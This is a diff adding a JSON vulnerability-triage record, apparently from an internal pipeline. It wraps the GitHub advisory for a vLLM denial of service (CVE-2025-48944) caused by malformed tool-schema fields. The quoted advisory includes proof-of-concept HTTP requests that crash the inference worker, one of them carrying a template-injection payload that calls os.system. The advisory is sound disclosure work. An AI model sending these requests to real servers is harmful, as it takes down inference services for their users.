@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"coordinator\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/309258?v=4\", \"events_url\": \"https://api.github.com/users/russellb/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/russellb/followers\", \"following_url\": \"https://api.github.com/users/russellb/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/russellb/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/russellb\", \"id\": 309258, \"login\": \"russellb\", \"node_id\": \"MDQ6VXNlcjMwOTI1OA==\", \"organizations_url\": \"https://api.github.com/users/russellb/orgs\", \"received_events_url\": \"https://api.github.com/users/russellb/received_events\", \"repos_url\": \"https://api.github.com/users/russellb/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/russellb/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/russellb/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/russellb\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/27609953?v=4\", \"events_url\": \"https://api.github.com/users/Jason-CKY/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Jason-CKY/followers\", \"following_url\": \"https://api.github.com/users/Jason-CKY/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Jason-CKY/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Jason-CKY\", \"id\": 27609953, \"login\": \"Jason-CKY\", \"node_id\": \"MDQ6VXNlcjI3NjA5OTUz\", \"organizations_url\": \"https://api.github.com/users/Jason-CKY/orgs\", \"received_events_url\": \"https://api.github.com/users/Jason-CKY/received_events\", \"repos_url\": \"https://api.github.com/users/Jason-CKY/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Jason-CKY/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Jason-CKY/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Jason-CKY\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2025-48944\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}], \"description\": \"### Summary\\nThe vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected or malformed input in the \\\"pattern\\\" and \\\"type\\\" fields when the tools functionality is invoked. These inputs are not validated before being compiled or parsed, causing a crash of the inference worker with a single request. The worker will remain down until it is restarted. \\n\\n### Details\\nThe \\\"type\\\" field is expected to be one of: \\\"string\\\", \\\"number\\\", \\\"object\\\", \\\"boolean\\\", \\\"array\\\", or \\\"null\\\". Supplying any other value will cause the worker to crash with the following error:\\n\\nRuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637: Unsupported type \\\"something_or_nothing\\\"\\n\\nThe \\\"pattern\\\" field undergoes Jinja2 rendering (I think) prior to being passed unsafely into the native regex compiler without validation or escaping. This allows malformed expressions to reach the underlying C++ regex engine, resulting in fatal errors.\\n\\nFor example, the following inputs will crash the worker:\\n\\nUnclosed {, [, or (\\n\\nClosed:{} and []\\n\\nHere are some of runtime errors on the crash depending on what gets injected:\\n\\nRuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73: Regex parsing error at position 4: The parenthesis is not closed.\\nRuntimeError: [10:52:27] /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition count.\\nRuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error at position 6: Two consecutive repetition modifiers are not allowed.\\n\\n### PoC\\nHere is the POST request using the type field to crash the worker. Note the type field is set to \\\"something\\\" rather than the expected types it is looking for:\\nPOST /v1/chat/completions HTTP/1.1\\nHost: \\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\\nAccept: application/json\\nAccept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate, br\\nReferer: \\nContent-Type: application/json\\nContent-Length: 579\\nOrigin: \\nSec-Fetch-Dest: empty\\nSec-Fetch-Mode: cors\\nSec-Fetch-Site: same-origin\\nPriority: u=0\\nTe: trailers\\nConnection: keep-alive\\n\\n{\\n  \\\"model\\\": \\\"mistral-nemo-instruct\\\",\\n  \\\"messages\\\": [{ \\\"role\\\": \\\"user\\\", \\\"content\\\": \\\"crash via type\\\" }],\\n  \\\"tools\\\": [\\n    {\\n      \\\"type\\\": \\\"function\\\",\\n      \\\"function\\\": {\\n        \\\"name\\\": \\\"crash01\\\",\\n        \\\"parameters\\\": {\\n          \\\"type\\\": \\\"object\\\",\\n          \\\"properties\\\": {\\n            \\\"a\\\": {\\n              \\\"type\\\": \\\"something\\\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  ],\\n  \\\"tool_choice\\\": {\\n    \\\"type\\\": \\\"function\\\",\\n    \\\"function\\\": {\\n      \\\"name\\\": \\\"crash01\\\",\\n      \\\"arguments\\\": { \\\"a\\\": \\\"test\\\" }\\n    }\\n  },\\n  \\\"stream\\\": false,\\n  \\\"max_tokens\\\": 1\\n}\\n\\nHere is the POST request using the pattern field to crash the worker. Note the pattern field is set to a RCE payload, it could have just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.\\n\\nPOST /v1/chat/completions HTTP/1.1\\nHost: \\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\\nAccept: application/json\\nAccept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate, br\\nReferer: \\nContent-Type: application/json\\nContent-Length: 718\\nOrigin: \\nSec-Fetch-Dest: empty\\nSec-Fetch-Mode: cors\\nSec-Fetch-Site: same-origin\\nPriority: u=0\\nTe: trailers\\nConnection: keep-alive\\n\\n{\\n  \\\"model\\\": \\\"mistral-nemo-instruct\\\",\\n  \\\"messages\\\": [\\n    {\\n      \\\"role\\\": \\\"user\\\",\\n      \\\"content\\\": \\\"Crash via Pattern\\\"\\n    }\\n  ],\\n  \\\"tools\\\": [\\n    {\\n      \\\"type\\\": \\\"function\\\",\\n      \\\"function\\\": {\\n        \\\"name\\\": \\\"crash02\\\",\\n        \\\"parameters\\\": {\\n          \\\"type\\\": \\\"object\\\",\\n          \\\"properties\\\": {\\n            \\\"a\\\": {\\n              \\\"type\\\": \\\"string\\\",\\n\\\"pattern\\\": \\\"{{ __import__('os').system('echo RCE_OK > /tmp/pwned') or 'SAFE' }}\\\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  ],\\n  \\\"tool_choice\\\": {\\n    \\\"type\\\": \\\"function\\\",\\n    \\\"function\\\": {\\n      \\\"name\\\": \\\"crash02\\\"\\n    }\\n  },\\n  \\\"stream\\\": false,\\n  \\\"max_tokens\\\": 32,\\n  \\\"temperature\\\": 0.2,\\n  \\\"top_p\\\": 1,\\n  \\\"n\\\": 1\\n}\\n\\n### Impact\\nBackend workers can be crashed causing anyone to using the inference engine to get 500 internal server errors on subsequent requests. \\n\\n### Fix\\n\\n* https://github.com/vllm-project/vllm/pull/17623\", \"epss\": {\"percentage\": 0.00449, \"percentile\": 0.35671}, \"ghsa_id\": \"GHSA-vrq3-r879-7m65\", \"github_reviewed_at\": \"2025-05-28T19:42:32Z\", \"html_url\": \"https://github.com/advisories/GHSA-vrq3-r879-7m65\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vrq3-r879-7m65\"}, {\"type\": \"CVE\", \"value\": \"CVE-2025-48944\"}], \"nvd_published_at\": \"2025-05-30T19:15:30Z\", \"published_at\": \"2025-05-28T19:42:32Z\", \"references\": [\"https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65\", \"https://github.com/vllm-project/vllm/pull/17623\", \"https://nvd.nist.gov/vuln/detail/CVE-2025-48944\", \"https://github.com/advisories/GHSA-vrq3-r879-7m65\", \"https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-2023.yaml\", \"https://github.com/vllm-project/vllm\", \"https://pypi.org/project/vllm\"], \"repository_advisory_url\": \"https://api.github.com/repos/vllm-project/vllm/security-advisories/GHSA-vrq3-r879-7m65\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/vllm-project/vllm\", \"summary\": \"vLLM Tool Schema allows DoS via Malformed pattern and type Fields\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-17T16:14:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-vrq3-r879-7m65\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"vllm\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.8.0, < 0.9.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vrq3-r879-7m65",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vllm: >= 0.8.0, < 0.9.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2025-48944"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vllm"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:54.701017Z",
+  "provenance": {
+    "content_sha256": "4b1277d0897357169ed78a1ac53c31b048df714227aeb6b1713cc277039b808c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2025-05-28T19:42:32Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vrq3-r879-7m65",
+  "status": "active",
+  "title": "vLLM Tool Schema allows DoS via Malformed pattern and type Fields",
+  "updated_at": "2026-07-17T16:14:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vrq3-r879-7m65"
+}
